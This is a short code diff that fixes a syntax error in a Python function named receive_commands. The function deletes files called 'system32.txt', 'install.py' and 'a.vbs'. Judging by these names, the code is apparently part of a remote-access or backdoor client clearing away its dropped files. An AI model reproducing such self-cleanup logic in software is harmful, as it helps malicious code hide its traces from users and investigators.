@@ -110,7 +110,7 @@ def receive_commands():
                 os.remove("system32.txt")
             if os.path.exists("install.py"):
                 os.remove("install.py")
-            if os.path.exists("a.vbs");
+            if os.path.exists("a.vbs"):
                 os.remove("a.vbs")
 
             dir = os.getcwd()
